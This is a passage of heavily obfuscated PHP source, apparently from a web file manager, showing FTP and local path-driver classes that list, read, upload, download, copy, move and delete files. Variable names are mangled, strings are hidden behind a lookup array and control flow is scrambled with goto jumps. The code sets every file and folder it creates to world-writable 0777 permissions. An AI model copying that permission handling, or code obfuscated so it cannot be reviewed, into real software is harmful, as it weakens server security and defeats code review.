BºŠÛ¡ß§: } private function folderInfo($DóÑ¾Ñ™Š¢, $c²ÈÑ “„œ = false) { $A‡İÌËù½ =& $_SERVER[Ü˜]; $B¬ç‚ˆò¼õ = array($A‡İÌËù½[28] => $this->pathThis($DóÑ¾Ñ™Š¢), $A‡İÌËù½[86] => $this->getPathOuter($A‡İÌËù½[8] . $DóÑ¾Ñ™Š¢), $A‡İÌËù½[29] => $A‡İÌËù½[87]); if ($c²ÈÑ “„œ) { return $B¬ç‚ˆò¼õ; } $B¬ç‚ˆò¼õ[$A‡İÌËù½[204]] = $B¬ç‚ˆò¼õ[$A‡İÌËù½[94]] = 0; $B¬ç‚ˆò¼õ[$A‡İÌËù½[205]] = $B¬ç‚ˆò¼õ[$A‡İÌËù½[206]] = !0; return $B¬ç‚ˆò¼õ; } private function fileInfo($bÖó§†›, $BŞÏ÷Ò‹‰š = false, $aÎÒÊ‹¬»Ñ = array()) { goto bÂŒ³¤‰¬¾; bÂŒ³¤‰¬¾: $eË†¡ˆ«Ğ =& $_SERVER[Ü˜]; $F‚ŠÜÓÜªÀ = array($eË†¡ˆ«Ğ[28] => $this->pathThis($bÖó§†›), $eË†¡ˆ«Ğ[86] => $this->getPathOuter($eË†¡ˆ«Ğ[8] . $bÖó§†›), $eË†¡ˆ«Ğ[29] => $eË†¡ˆ«Ğ[203], $eË†¡ˆ«Ğ[88] => isset($aÎÒÊ‹¬»Ñ[$eË†¡ˆ«Ğ[88]]) ? $aÎÒÊ‹¬»Ñ[$eË†¡ˆ«Ğ[88]] : 0, $eË†¡ˆ«Ğ[178] => $this->ext($bÖó§†›)); if ($BŞÏ÷Ò‹‰š) { return $F‚ŠÜÓÜªÀ; } goto C¿ìˆØô»á; C¿ìˆØô»á: $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[204]] = $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[94]] = 0; $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[205]] = $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[206]] = !0; $Eí­¤ê‰‰— = $this->iconvSystem($bÖó§†›); goto Fì„åìêéË; Fì„åìêéË: $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[94]] = @ftp_mdtm($this->connect, $Eí­¤ê‰‰—); if (empty($aÎÒÊ‹¬»Ñ)) { $aÎÒÊ‹¬»Ñ = $this->objectMeta($bÖó§†›); if (!$aÎÒÊ‹¬»Ñ) { return $F‚ŠÜÓÜªÀ; } } $F‚ŠÜÓÜªÀ[$eË†¡ˆ«Ğ[88]] = $aÎÒÊ‹¬»Ñ[$eË†¡ˆ«Ğ[88]]; goto c¥µ¿Å¯Şë; c¥µ¿Å¯Şë: return $F‚ŠÜÓÜªÀ; goto aí©ÊÛñó„; aí©ÊÛñó„: } public function size($dØ˜õ—´¤) { $bÏñÊµß = $this->objectMeta($dØ˜õ—´¤); return $bÏñÊµß ? $bÏñÊµß[$_SERVER[Ü˜][88]] : 0; } public function info($F¿œ¤±Äµ) { if ($this->isFile($F¿œ¤±Äµ)) { return $this->fileInfo($F¿œ¤±Äµ, 0); } else { if ($this->isFolder($F¿œ¤±Äµ)) { return $this->folderInfo($F¿œ¤±Äµ); } } return !1; } private function fileList($DÈàôõÚ×, &$Eíåóğ¥Ôé, &$EàÌª‡Ô†ù, $aŸ»ˆ˜¦Ïî = false) { goto b‘ÄËƒ¾İ”; EğÍéáÅ¨Û: $dº¥ÃíğâŸ = $this->listItemCache === !1 ? !1 : !0; $fØ›êá½ƒ = @ftp_rawlist($this->connect, $DÈàôõÚ×); if (!$fØ›êá½ƒ) { $fØ›êá½ƒ = array(); } goto DŠíÁÉÁŠÎ; DŠíÁÉÁŠÎ: $bÓˆ†»Êâ™ = array($E™ƒî¡é‘[105] => 1, $E™ƒî¡é‘[1253] => 1); foreach ($fØ›êá½ƒ as $D“ìéÀŒ) { goto Cï“«èŞ×; Cï“«èŞ×: $Eä Ù³¬«Â = $this->_listItem($D“ìéÀŒ); if ($Eä Ù³¬«Â[0] == $E™ƒî¡é‘[728]) { continue; } $B«í´ºİ±¦ = $Eä Ù³¬«Â[8]; goto D¸æÁ›Çµ–; D¸æÁ›Çµ–: if (empty($B«í´ºİ±¦) && $B«í´ºİ±¦ !== $E™ƒî¡é‘[201] || isset($bÓˆ†»Êâ™[$B«í´ºİ±¦])) { continue; } $B«í´ºİ±¦ = $this->iconvApp($DÈàôõÚ× . ltrim($B«í´ºİ±¦, $E™ƒî¡é‘[8])); $B•§ƒÇ›¿ = array($E™ƒî¡é‘[28] => $B«í´ºİ±¦, $E™ƒî¡é‘[29] => $E™ƒî¡é‘[203], $E™ƒî¡é‘[88] => $Eä Ù³¬«Â[4]); goto a¹ÍÇò½©†; dôƒ†ƒ‹ô¤: if ($A½ÆÎ‰ÊÚ…) { $Eíåóğ¥Ôé[] = $B«í´ºİ±¦; if ($aŸ»ˆ˜¦Ïî) { $this->fileList($B«í´ºİ±¦, $Eíåóğ¥Ôé, $EàÌª‡Ô†ù, $aŸ»ˆ˜¦Ïî); } continue; } $EàÌª‡Ô†ù[] = $B•§ƒÇ›¿; goto CÇò¿ê©§; a¹ÍÇò½©†: if (substr($D“ìéÀŒ, 0, 1) == $E™ƒî¡é‘[1254]) { $B•§ƒÇ›¿[$E™ƒî¡é‘[29]] = $E™ƒî¡é‘[87]; $B•§ƒÇ›¿[$E™ƒî¡é‘[88]] = 0; } $A½ÆÎ‰ÊÚ… = $B•§ƒÇ›¿[$E™ƒî¡é‘[29]] == $E™ƒî¡é‘[87] ? !0 : !1; if ($dº¥ÃíğâŸ) { $this->cacheMethod($E™ƒî¡é‘[209], $B«í´ºİ±¦, $A½ÆÎ‰ÊÚ…); $this->cacheMethod($E™ƒî¡é‘[210], $B«í´ºİ±¦, $B•§ƒÇ›¿); } goto dôƒ†ƒ‹ô¤; CÇò¿ê©§: } if ($dº¥ÃíğâŸ) { $this->cacheMethod($E™ƒî¡é‘[209], $DÈàôõÚ×, !0); } goto béˆ›ŞÉ„; b‘ÄËƒ¾İ”: $E™ƒî¡é‘ =& $_SERVER[Ü˜]; $DÈàôõÚ× = $this->iconvSystem($DÈàôõÚ×); if (!$this->isFolder($DÈàôõÚ×)) { return !1; } goto E´–ÖÄƒß…; E´–ÖÄƒß…: @ftp_chdir($this->connect, $E™ƒî¡é‘[8]); $DÈàôõÚ× = rtrim($DÈàôõÚ×, $E™ƒî¡é‘[8]) . $E™ƒî¡é‘[8]; check_abort(); goto EğÍéáÅ¨Û; béˆ›ŞÉ„: } private function _listItem($Eóâ¦µÊºÈ) { if (empty($Eóâ¦µÊºÈ)) { return array(); } $aÎ§¯šÚ‚ = preg_split($_SERVER[Ü˜][1255], $Eóâ¦µÊºÈ); if (count($aÎ§¯šÚ‚) <= 9) { return $aÎ§¯šÚ‚; } $aÎ§¯šÚ‚[8] = trim(substr($Eóâ¦µÊºÈ, strpos($Eóâ¦µÊºÈ, $aÎ§¯šÚ‚[7]) + strlen($aÎ§¯šÚ‚[7]))); return array_splice($aÎ§¯šÚ‚, 0, 9); } public function listPath($B›ƒ¶˜×Çè, $Eƒõ¼‰’÷ = false) { goto eòœˆÒ˜Ì; Eº¦àæöç–: return array($C‹ ë£Ïïà[85] => $E»öãÎòé, $C‹ ë£Ïïà[84] => $BÛİ„ í²); goto BìªÂ£Ä×†; C¾‘‡½Şß: $this->fileList($B›ƒ¶˜×Çè, $E»öãÎòé, $BÛİ„ í²); foreach ($E»öãÎòé as $aÕÏĞ¬—†È => $e„â’¿Ë½‹) { $E»öãÎòé[$aÕÏĞ¬—†È] = $this->folderInfo($e„â’¿Ë½‹, $Eƒõ¼‰’÷); } foreach ($BÛİ„ í² as $aÕÏĞ¬—†È => $e„â’¿Ë½‹) { $BÛİ„ í²[$aÕÏĞ¬—†È] = $this->fileInfo($e„â’¿Ë½‹[$C‹ ë£Ïïà[28]], $Eƒõ¼‰’÷, $e„â’¿Ë½‹); } goto Eº¦àæöç–; eòœˆÒ˜Ì: $C‹ ë£Ïïà =& $_SERVER[Ü˜]; if (!$this->_isconn()) { return !1; } $E»öãÎòé = $BÛİ„ í² = array(); goto C¾‘‡½Şß; BìªÂ£Ä×†: } public function has($cåá­é„Ô, $AÎÙ¸ø‚£— = false, $e§àŒïÓ¡ô = true) { goto CÎÑŞÆİ‰ø; CÎÑŞÆİ‰ø: $F‚Ÿ³¯®Ö =& $_SERVER[Ü˜]; $dŞºøÊÚù§ = $Dà£‡—î‰ = array(); $DÁÉ²‚Ú’ = $AÎÙ¸ø‚£— ? !0 : !1; goto AÄÍÒº¿øò; AóÈªğÛˆ: return !1; goto D¹Ì÷‡öÃ; AÄÍÒº¿øò: $this->fileList($cåá­é„Ô, $dŞºøÊÚù§, $Dà£‡—î‰, $DÁÉ²‚Ú’); if ($AÎÙ¸ø‚£—) { return array($F‚Ÿ³¯®Ö[213] => count($Dà£‡—î‰), $F‚Ÿ³¯®Ö[214] => count($dŞºøÊÚù§)); } if ($e§àŒïÓ¡ô) { if (count($Dà£‡—î‰)) { return !0; } } else { if (count($dŞºøÊÚù§)) { return !0; } } goto AóÈªğÛˆ; D¹Ì÷‡öÃ: } public function listAll($E¶ö›Î×Ô) { goto FÂÑš‚Ü‡; FÂÑš‚Ü‡: $bá¡Ñ·ƒÕ =& $_SERVER[Ü˜]; if (!$this->_isconn()) { return !1; } $DŒ©ÌÎ¥¬ = $dâàÄë©¾ö = array(); goto d™—ï£—¦Í; f¢ñ¼¨µ¹Š: foreach ($DŒ©ÌÎ¥¬ as $a¹×¬¸¸‚) { if (is_string($a¹×¬¸¸‚)) { $e˜Ñ¶ó”îè[$a¹×¬¸¸‚] = 0; } } return $this->listAllFiles($E¶ö›Î×Ô, array_keys($e˜Ñ¶ó”îè), $e˜Ñ¶ó”îè); goto FàÖğŠ±; d™—ï£—¦Í: $this->fileList($E¶ö›Î×Ô, $DŒ©ÌÎ¥¬, $dâàÄë©¾ö, !0); $e˜Ñ¶ó”îè = array(); foreach ($dâàÄë©¾ö as $a¹×¬¸¸‚) { $e˜Ñ¶ó”îè[$a¹×¬¸¸‚[$bá¡Ñ·ƒÕ[28]]] = $a¹×¬¸¸‚[$bá¡Ñ·ƒÕ[88]]; } goto f¢ñ¼¨µ¹Š; FàÖğŠ±: } public function getContent($c¨êÈâÄÄ¹) { if (!$this->_isconn()) { return !1; } $c¨êÈâÄÄ¹ = $this->iconvSystem($c¨êÈâÄÄ¹); return $this->fileSubstr($c¨êÈâÄÄ¹); } public function setContent($dİŞ£¶·ÑÎ, $AŸºÊ¿¤•Ù = '') { goto cÌÅ…âô™İ; d¹ãŠîÇš: file_put_contents($fìÎ¸»¼‡, $AŸºÊ¿¤•Ù); $cçáº×ÇÊ« = $this->upload($dİŞ£¶·ÑÎ, $this->iconvApp($fìÎ¸»¼‡)); $this->tempFileRemve($fìÎ¸»¼‡); goto fÀ±·°«Î; cÌÅ…âô™İ: if (!$this->_isconn()) { return !1; } $Fˆ›Ì÷Äè = $this->pathThis($this->iconvSystem($dİŞ£¶·ÑÎ)); $fìÎ¸»¼‡ = $this->tempFile($Fˆ›Ì÷Äè); goto d¹ãŠîÇš; fÀ±·°«Î: return $cçáº×ÇÊ«; goto D– ¤Îª÷ˆ; D– ¤Îª÷ˆ: } public function fileSubstr($f×Ø„Ä‚», $C‘‘­å³¥‹ = 0, $B²£ºµğøö = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($f×Ø„Ä‚», $C‘‘­å³¥‹, $B²£ºµğøö); } private function ftpRequest($Aî÷¶¹Î, $DŞÓ™·óŠ = 0, $cÃÜæ—ù¢Ó = false) { goto C©Šƒ˜¶¢Ğ; C©Šƒ˜¶¢Ğ: $Aî÷¶¹Î = $this->iconvSystem($Aî÷¶¹Î); $F¥†ì Ş³Æ = $this->scheme . $this->host . $_SERVER[Ü˜][4] . $this->port; $A´ËÏëÂ¡ˆ = curl_init(); goto Fá§áÍÒµÑ; c¤Ï±àÑ ¯: return $dœ³« —øÂ; goto Fåâ‰•…’·; eªÅÂ×ÊÂØ: curl_setopt($A´ËÏëÂ¡ˆ, CURLOPT_RETURNTRANSFER, 1); $dœ³« —øÂ = curl_exec($A´ËÏëÂ¡ˆ); curl_close($A´ËÏëÂ¡ˆ); goto c¤Ï±àÑ ¯; Fá§áÍÒµÑ: curl_setopt($A´ËÏëÂ¡ˆ, CURLOPT_URL, $F¥†ì Ş³Æ . $this->pathEncode($Aî÷¶¹Î)); curl_setopt($A´ËÏëÂ¡ˆ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($cÃÜæ—ù¢Ó) { $Eƒ¾ÖŒ®¾Ü = $DŞÓ™·óŠ + $cÃÜæ—ù¢Ó - 1; curl_setopt($A´ËÏëÂ¡ˆ, CURLOPT_RANGE, "{$DŞÓ™·óŠ}\x2d{$Eƒ¾ÖŒ®¾Ü}"); } goto eªÅÂ×ÊÂØ; Fåâ‰•…’·: } public function upload($F‰Ã“µ°Ö·, $Føñö¦Ğ‡Ê, $C±–È¨Ê®Ï = false, $EíÒŞºÛå = REPEAT_REPLACE) { goto Dƒ¬ß½…™¶; B‰ã°§¥‰à: if ($Bñ¦”„Æ¹® != FTP_FINISHED) { return !1; } return $this->getPathOuter($F‰Ã“µ°Ö·); goto aõÍ¬Øø; Dƒ¬ß½…™¶: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($F‰Ã“µ°Ö·))) { return !1; } $F‰Ã“µ°Ö· = $this->iconvSystem($F‰Ã“µ°Ö·); goto CºÛ‹…”; CºÛ‹…”: $Føñö¦Ğ‡Ê = $this->iconvSystem($Føñö¦Ğ‡Ê); $Bñ¦”„Æ¹® = ftp_nb_put($this->connect, $F‰Ã“µ°Ö·, $Føñö¦Ğ‡Ê, FTP_BINARY); while ($Bñ¦”„Æ¹® == FTP_MOREDATA) { $Bñ¦”„Æ¹® = ftp_nb_continue($this->connect); } goto B‰ã°§¥‰à; aõÍ¬Øø: } public function download($E¥ÂØ–Ï»Ó, $còÅÚàµ§… = '') { goto aõŞÓ×ö¦š; aõŞÓ×ö¦š: if (!$this->_isconn()) { return !1; } $eÀ„Ú¨ç– = $this->pathFather($còÅÚàµ§…); if (!IO::mkdir($eÀ„Ú¨ç–)) { return !1; } goto a‰Î”‰Û¹õ; dÎ±“£®•‰: while ($CÍ²¡¼§˜ == FTP_MOREDATA) { $CÍ²¡¼§˜ = ftp_nb_continue($this->connect); } if ($CÍ²¡¼§˜ != FTP_FINISHED) { return !1; } return $this->iconvApp($còÅÚàµ§…); goto fáŒ¾­½–¦; a‰Î”‰Û¹õ: $E¥ÂØ–Ï»Ó = $this->iconvSystem($E¥ÂØ–Ï»Ó); $còÅÚàµ§… = $this->iconvSystem($còÅÚàµ§…); $CÍ²¡¼§˜ = ftp_nb_get($this->connect, $còÅÚàµ§…, $E¥ÂØ–Ï»Ó, FTP_BINARY); goto dÎ±“£®•‰; fáŒ¾­½–¦: } public function exist($A‘ùÈÓƒÈ) { return $this->isFile($A‘ùÈÓƒÈ) || $this->isFolder($A‘ùÈÓƒÈ); } public function isFile($a¯Ïµ’‰Ë) { return !$this->isFolder($a¯Ïµ’‰Ë) && $this->objectMeta($a¯Ïµ’‰Ë); } public function isFolder($F…‘Ñèˆ¼) { return $this->cacheMethod($_SERVER[Ü˜][209], $F…‘Ñèˆ¼); } protected function objectMeta($A¾èµ¬µæ£) { return $this->cacheMethod($_SERVER[Ü˜][210], $A¾èµ¬µæ£); } protected function _objectMeta($E­£ÔÏÌ˜™) { goto aÅÊ†‚ªå; Bö‹çö‚É: $EãîÏÅ†ø = @ftp_size($this->connect, $E­£ÔÏÌ˜™); if ($EãîÏÅ†ø != -1) { $f¶Šµ§íßğ[$DÊÏ¿ø‘Æ [88]] = $EãîÏÅ†ø; } else { $d¬ºğ¸´²É = @ftp_chdir($this->connect, $E­£ÔÏÌ˜™); if (!$d¬ºğ¸´²É) { return !1; } $f¶Šµ§íßğ[$DÊÏ¿ø‘Æ [29]] = $DÊÏ¿ø‘Æ [87]; } return $f¶Šµ§íßğ; goto CæöÇôë¼É; F’…ŒğÌÅØ: $E­£ÔÏÌ˜™ = $this->iconvSystem($E­£ÔÏÌ˜™); $f¶Šµ§íßğ = array($DÊÏ¿ø‘Æ [28] => $this->iconvApp($E­£ÔÏÌ˜™), $DÊÏ¿ø‘Æ [29] => $DÊÏ¿ø‘Æ [203], $DÊÏ¿ø‘Æ [88] => 0); @ftp_chdir($this->connect, $DÊÏ¿ø‘Æ [8]); goto Bö‹çö‚É; aÅÊ†‚ªå: $DÊÏ¿ø‘Æ  =& $_SERVER[Ü˜]; if ($E­£ÔÏÌ˜™ == $DÊÏ¿ø‘Æ [33] || $E­£ÔÏÌ˜™ == $DÊÏ¿ø‘Æ [8]) { return array(); } if (!$this->_isconn()) { return !1; } goto F’…ŒğÌÅØ; CæöÇôë¼É: } protected function _isFolder($eĞÍÜƒÛ ) { $bÖíŠˆ‹Ï– =& $_SERVER[Ü˜]; if ($eĞÍÜƒÛ  == $bÖíŠˆ‹Ï–[33] || $eĞÍÜƒÛ  == $bÖíŠˆ‹Ï–[8]) { return !0; } $e•åÀŠãŒ = $this->_objectMeta($eĞÍÜƒÛ ); return isset($e•åÀŠãŒ[$bÖíŠˆ‹Ï–[29]]) && $e•åÀŠãŒ[$bÖíŠˆ‹Ï–[29]] == $bÖíŠˆ‹Ï–[87] ? !0 : !1; } } goto dÃµÉÆŠ›; dÃµÉÆŠ›: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($A·§ê‚Œ«æ) { if (substr($A·§ê‚Œ«æ, 0, 2) == $_SERVER[Ü˜][1246]) { $A·§ê‚Œ«æ = BASIC_PATH . substr($A·§ê‚Œ«æ, 2); } return $A·§ê‚Œ«æ; } public function iconvApp($fƒÒÇŒÌé˜) { $fÖÖæ’µŸ¯ =& $_SERVER[Ü˜]; global $config; return $this->iconvTo($fƒÒÇŒÌé˜, $config[$fÖÖæ’µŸ¯[1244]], $config[$fÖÖæ’µŸ¯[1243]]); } public function iconvSystem($Aµˆ«£’ğ) { $bîç‚ëì¨ =& $_SERVER[Ü˜]; global $config; return $this->iconvTo($Aµˆ«£’ğ, $config[$bîç‚ëì¨[1243]], $config[$bîç‚ëì¨[1244]]); } public function getPathOuter($d—Î£Ò»Êí) { goto føŒ´®Ñ—§; Fê‰ŠØİƒË: if (substr($e¸Ğí¸ô‘‡, 0, 2) == $Aîï‚ÊƒŒ[1246]) { $e¸Ğí¸ô‘‡ = BASIC_PATH . substr($e¸Ğí¸ô‘‡, 2); } if (substr($d—Î£Ò»Êí, 0, 2) == $Aîï‚ÊƒŒ[1246]) { $d—Î£Ò»Êí = BASIC_PATH . substr($d—Î£Ò»Êí, 2); } $e¸Ğí¸ô‘‡ = KodIO::clear($e¸Ğí¸ô‘‡); goto BİâºÃŸà¨; føŒ´®Ñ—§: $Aîï‚ÊƒŒ =& $_SERVER[Ü˜]; $e¸Ğí¸ô‘‡ = $this->iconvApp($this->pathBase); $d—Î£Ò»Êí = $this->iconvApp($d—Î£Ò»Êí); goto Fê‰ŠØİƒË; a‡Ù±ªÕ‘é: return $this->pathDriver . $Aîï‚ÊƒŒ[8] . ltrim($d—Î£Ò»Êí, $Aîï‚ÊƒŒ[8]); goto FÜô¯‘öƒ; BİâºÃŸà¨: $d—Î£Ò»Êí = KodIO::clear($d—Î£Ò»Êí); $d—Î£Ò»Êí = substr($d—Î£Ò»Êí, strlen($e¸Ğí¸ô‘‡)); if (empty($this->pathDriver)) { return $d—Î£Ò»Êí; } goto a‡Ù±ªÕ‘é; FÜô¯‘öƒ: } public function mkfile($aŠñèğ±¦Ø, $AĞÇçí÷°‚ = '', $f°„Ãœ¶œ± = REPEAT_RENAME) { $aŠñèğ±¦Ø = $this->iconvSystem($aŠñèğ±¦Ø); @touch($aŠñèğ±¦Ø); if ($AĞÇçí÷°‚) { file_put_contents($aŠñèğ±¦Ø, $AĞÇçí÷°‚); } @chmod($aŠñèğ±¦Ø, 511); return is_file($aŠñèğ±¦Ø) ? $this->getPathOuter($aŠñèğ±¦Ø) : !1; } public function mkdir($E–¤‡Ò»³â, $B¸›¯•á›Á = REPEAT_SKIP) { $E–¤‡Ò»³â = $this->iconvSystem($E–¤‡Ò»³â); if (is_dir($E–¤‡Ò»³â)) { return $this->getPathOuter($E–¤‡Ò»³â); } @mkdir($E–¤‡Ò»³â, 511, !0); @chmod($E–¤‡Ò»³â, 511); return is_dir($E–¤‡Ò»³â) ? $this->getPathOuter($E–¤‡Ò»³â) : !1; } public function copyFile($F„ˆÃöÀ…, $CÔË—ÏÛ‹Ç) { $this->mkdir($this->pathFather($CÔË—ÏÛ‹Ç)); $F„ˆÃöÀ… = $this->iconvSystem($F„ˆÃöÀ…); $CÔË—ÏÛ‹Ç = $this->iconvSystem($CÔË—ÏÛ‹Ç); $EÎ¢¢ãÙäá = copy_64($F„ˆÃöÀ…, $CÔË—ÏÛ‹Ç); @chmod($CÔË—ÏÛ‹Ç, 511); return $EÎ¢¢ãÙäá ? $this->getPathOuter($CÔË—ÏÛ‹Ç) : !1; } public function moveFile($d‹¸è´„÷ó, $A±¹ÉŞ¨î) { goto BÉ¦•¨öç¦; bæèÙ‰­£: return $dë¤¾ØŒ’Ù ? $this->getPathOuter($A±¹ÉŞ¨î) : !1; goto Dò™Êé³ƒ»; dŠ”¹©‹Û«: $dë¤¾ØŒ’Ù = intval(@rename($d‹¸è´„÷ó, $A±¹ÉŞ¨î)); if (!$dë¤¾ØŒ’Ù) { if ($dë¤¾ØŒ’Ù = intval(@copy_64($d‹¸è´„÷ó, $A±¹ÉŞ¨î))) { @unlink($d‹¸è´„÷ó); } } @chmod($A±¹ÉŞ¨î, 511); goto bæèÙ‰­£; BÉ¦•¨öç¦: $this->mkdir($this->pathFather($A±¹ÉŞ¨î)); $d‹¸è´„÷ó = $this->iconvSystem($d‹¸è´„÷ó); $A±¹ÉŞ¨î = $this->iconvSystem($A±¹ÉŞ¨î); goto dŠ”¹©‹Û«; Dò™Êé³ƒ»: } public function delFile($Ašƒˆ¹‰ù›) { $Ašƒˆ¹‰ù› = $this->iconvSystem($Ašƒˆ¹‰ù›); if (!@unlink($Ašƒˆ¹‰ù›)) { @chmod($Ašƒˆ¹‰ù›, 511); if (!@unlink($Ašƒˆ¹‰ù›)) { return !1; } } else { return !0; } } public function delFolder($bÌ»ÓÓÔ¤) { goto b¾ñÂî‡•Ò; b¾ñÂî‡•Ò: $eÆø˜ÈŸµ =& $_SERVER[Ü˜]; $bÌ»ÓÓÔ¤ = $this->iconvSystem($bÌ»ÓÓÔ¤); if (!is_dir($bÌ»ÓÓÔ¤)) { return !0; } goto CÎªÏÚì­; CÎªÏÚì­: if (!($BĞ•ƒœ›± = opendir($bÌ»ÓÓÔ¤))) { return !1; } while (($D«‘Ì„”½İ = readdir($BĞ•ƒœ›±)) !== !1) { if ($D«‘Ì„”½İ == $eÆø˜ÈŸµ[105] || $D«‘Ì„”½İ == $eÆø˜ÈŸµ[1253]) { continue; } $dŠÉôí«£¶ = $bÌ»ÓÓÔ¤ . $eÆø˜ÈŸµ[8] . $D«‘Ì„”½İ; if (is_file($dŠÉôí«£¶) || is_link($dŠÉôí«£¶)) { if (!unlink($dŠÉôí«£¶)) { chmod($dŠÉôí«£¶, 511); if (!unlink($dŠÉôí«£¶)) { return !1; } } } else { if (is_dir($dŠÉôí«£¶)) { chmod($dŠÉôí«£¶, 511); $dŠÉôí«£¶ = $this->iconvApp($dŠÉôí«£¶); if (!$this->delFolder($dŠÉôí«£¶)) { return !1; } } } } closedir($BĞ•ƒœ›±); goto CÀÖÇ‹°¼; CÀÖÇ‹°¼: return rmdir($bÌ»ÓÓÔ¤); goto bØÒØÊ‡¼¶; bØÒØÊ‡¼¶: } public function rename($aŒ¹„êˆèÓ, $fŠé¯éÆ‚) { goto E¢—Î­Šç; E¢—Î­Šç: $Dòß’ÂÇ =& $_SERVER[Ü˜]; $C¦Â˜¸âÇĞ = $this->fileNameAuto($this->pathFather($aŒ¹„êˆèÓ), $fŠé¯éÆ‚); $C¦Â˜¸âÇĞ = $this->iconvSystem($C¦Â˜¸âÇĞ); goto aÙÚ„‹Ÿ¼Æ; aÙÚ„‹Ÿ¼Æ: $aŒ¹„êˆèÓ = $this->iconvSystem($aŒ¹„êˆèÓ); $AßÍ—”¡È— = $this->pathFather($aŒ¹„êˆèÓ); $b¹Àœ¼Œµ = rtrim($AßÍ—”¡È—, $Dòß’ÂÇ[8]) . $Dòß’ÂÇ[8] . $C¦Â˜¸âÇĞ; goto dÕË°‘ñÂ; dÕË°‘ñÂ: $a©ëç§Œ×Õ = @rename($aŒ¹„êˆèÓ, $b¹Àœ¼Œµ); $b¹Àœ¼Œµ = $this->iconvApp($b¹Àœ¼Œµ); return $a©ëç§Œ×Õ ? $this->getPathOuter($b¹Àœ¼Œµ) : !1; goto Bš­ª¬ãÃÈ; Bš­ª¬ãÃÈ: } public function size($BĞ‰ö½”î©) { $BĞ‰ö½”î© = $this->iconvSystem($BĞ‰ö½”î©); return filesize_64($BĞ‰ö½”î©); } public function info($d³–†¾Õİ) { $d³–†¾Õİ = $this->iconvSystem($d³–†¾Õİ); if ($this->isFolder($d³–†¾Õİ)) { return $this->folderInfo($d³–†¾Õİ); } else { if ($this->isFile($d³–†¾Õİ)) { return $this->fileInfo($d³–†¾Õİ); } } return !1; } protected function infoChildren($dÀ‘øæå«®, &$FØ™àö‡§‘, $A•ñÏ‡œë© = true) { goto c”Ş‘ÀÅÛ; E’™Úì˜Ü: closedir($cæ­Ùø·Ç²); goto e‚£¿å¡Ş£; e¹·àœ²Ş: if ($A•ñÏ‡œë©) { $dÀ‘øæå«® = $this->iconvSystem($dÀ‘øæå«®); } if (!($cæ­Ùø·Ç² = @opendir($dÀ‘øæå«®))) { return; } while (($F¥Á–õŸ¥¾ = readdir($cæ­Ùø·Ç²)) !== !1) { if ($F¥Á–õŸ¥¾ == $c¸×­åâá–[105] || $F¥Á–õŸ¥¾ == $c¸×­åâá–[1253]) { continue; } $fÊ”×„¦õ˜ = $dÀ‘øæå«® . $F¥Á–õŸ¥¾; if (is_file($fÊ”×„¦õ˜) || is_link($fÊ”×„¦õ˜)) { $FØ™àö‡§‘[$c¸×­åâá–[89]]++; $FØ™àö‡§‘[$c¸×­åâá–[88]] += filesize_64($fÊ”×„¦õ˜); } else { if (is_dir($fÊ”×„¦õ˜)) { $FØ™àö‡§‘[$c¸×­åâá–[90]]++; $this->infoChildren($fÊ”×„¦õ˜, $FØ™àö‡§‘, !1); } } } goto E’™Úì˜Ü; c”Ş‘ÀÅÛ: $c¸×­åâá– =& $_SERVER[Ü˜]; check_abort_echo(); $dÀ‘øæå«® = rtrim($dÀ‘øæå«®, $c¸×­åâá–[8]) . $c¸×­åâá–[8]; goto e¹·àœ²Ş; e‚£¿å¡Ş£: } private function folderInfo($EëÀÉËÍŸ, $Bß‘‡æ®Íå = false) { $c”çğ¦äßƒ =& $_SERVER[Ü˜]; $EëÀÉËÍŸ = rtrim($EëÀÉËÍŸ, $c”çğ¦äßƒ[8]) . $c”çğ¦äßƒ[8]; $D°óÇßÌŠ = $this->iconvApp($this->pathThis($EëÀÉËÍŸ)); if ($Bß‘‡æ®Íå) { return array($c”çğ¦äßƒ[28] => $D°óÇßÌŠ, $c”çğ¦äßƒ[86] => $this->getPathOuter($EëÀÉËÍŸ), $c”çğ¦äßƒ[29] => $c”çğ¦äßƒ[87]); } $BæÁéî«ˆ = array($c”çğ¦äßƒ[28] => $D°óÇßÌŠ, $c”çğ¦äßƒ[86] => $this->getPathOuter($EëÀÉËÍŸ), $c”çğ¦äßƒ[29] => $c”çğ¦äßƒ[87], $c”çğ¦äßƒ[204] => @filectime($EëÀÉËÍŸ), $c”çğ¦äßƒ[94] => @filemtime($EëÀÉËÍŸ), $c”çğ¦äßƒ[1256] => @fileatime($EëÀÉËÍŸ), $c”çğ¦äßƒ[1257] => is_readable($EëÀÉËÍŸ), $c”çğ¦äßƒ[1258] => is_writable($EëÀÉËÍŸ), $c”çğ¦äßƒ[1259] => get_mode($EëÀÉËÍŸ)); return $BæÁéî«ˆ; } private function fileInfo($DˆµÄÎæ†«, $E ‚Â¦‡¼ = false) { $C¦ƒöƒç• =& $_SERVER[Ü˜]; $b®Ã˜·ÓÅÛ = $this->iconvApp($this->pathThis($DˆµÄÎæ†«)); if ($E ‚Â¦‡¼) { return array($C¦ƒöƒç•[28] => $b®Ã˜·ÓÅÛ, $C¦ƒöƒç•[86] => $this->getPathOuter($DˆµÄÎæ†«), $C¦ƒöƒç•[29] => $C¦ƒöƒç•[203], $C¦ƒöƒç•[88] => $this->size($DˆµÄÎæ†«), $C¦ƒöƒç•[178] => $this->ext($b®Ã˜·ÓÅÛ)); } $aó“£ñ¨¡™ = array($C¦ƒöƒç•[28] => $b®Ã˜·ÓÅÛ, $C¦ƒöƒç•[86] => $this->getPathOuter($DˆµÄÎæ†«), $C¦ƒöƒç•[29] => $C¦ƒöƒç•[203], $C¦ƒöƒç•[204] => @filectime($DˆµÄÎæ†«), $C¦ƒöƒç•[94] => @filemtime($DˆµÄÎæ†«), $C¦ƒöƒç•[1256] => @fileatime($DˆµÄÎæ†«), $C¦ƒöƒç•[88] => $this->size($DˆµÄÎæ†«), $C¦ƒöƒç•[178] => $this->ext($b®Ã˜·ÓÅÛ), $C¦ƒöƒç•[1257] => is_readable($DˆµÄÎæ†«), $C¦ƒöƒç•[1258] => is_writable($DˆµÄÎæ†«), $C¦ƒöƒç•[1259] => get_mode($DˆµÄÎæ†«)); return 